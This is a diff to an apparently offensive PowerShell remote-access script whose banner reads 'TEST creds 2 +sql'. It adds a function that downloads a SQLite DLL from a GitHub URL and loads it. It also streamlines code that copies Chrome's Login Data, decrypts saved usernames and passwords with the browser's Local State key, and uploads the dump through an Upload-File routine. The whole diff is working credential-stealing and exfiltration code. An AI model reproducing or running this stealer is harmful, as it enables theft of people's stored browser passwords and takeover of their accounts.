@@ -391,12 +391,34 @@ function PortSuggest {
 
 
 
-    
-   function Get-DecryptedChromeCreds {
+
+
+
+
+
+ function Load-SQLite {
+    $dllPath = "$env:TEMP\System.Data.SQLite.dll"
+    $url = "https://github.com/LevVedrov/files/raw/main/System.Data.SQLite.dll"
+
+    if (-not (Test-Path $dllPath)) {
+        Output-Log "[*] Downloading SQLite assembly..."
+        Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing
+    }
+
     try {
-        Add-Type -AssemblyName System.Security
+        Add-Type -Path $dllPath
+        Output-Log "[+] SQLite DLL loaded from: $dllPath"
+        return $true
     } catch {
-        return "[ERROR] Не удалось загрузить System.Security: $($_.Exception.Message)"
+        Output-Log "[ERROR] Failed to load SQLite: $($_.Exception.Message)"
+        return $false
+    }
+}
+
+function Get-DecryptedChromeCreds {
+    Add-Type -AssemblyName System.Security
+    if (-not (Load-SQLite)) {
+        return "[ERROR] SQLite not loaded"
     }
 
     $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
@@ -414,11 +436,7 @@ function PortSuggest {
     $tempDb = "$env:TEMP\LoginData.db"
     Copy-Item $loginDataPath -Destination $tempDb -Force
 
-    try {
-        Add-Type -Path "$env:TEMP\System.Data.SQLite.dll"
-    } catch {}
-
-    $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source=$tempDb;Version=3;"
+    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
     $conn.Open()
     $cmd = $conn.CreateCommand()
     $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
@@ -451,14 +469,9 @@ function PortSuggest {
 
 function Get-Credentials {
     try {
-        $output = "[*] Dumping Chrome credentials..."
-
         $chromeCreds = Get-DecryptedChromeCreds
         if (Test-Path $chromeCreds) {
-            $output += "`n[+] Chrome credentials dumped to: $chromeCreds"
-            $uploadResult = Upload-File $chromeCreds
-            Remove-Item $chromeCreds -Force -ErrorAction SilentlyContinue
-            return $uploadResult
+            return Upload-File $chromeCreds
         } else {
             return "[ERROR] Chrome creds extraction failed."
         }
@@ -467,6 +480,11 @@ function Get-Credentials {
         return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
+
+
+
+
+
 
 
 
@@ -692,7 +710,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST creds 2
+                                            TEST creds 2 +sql
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
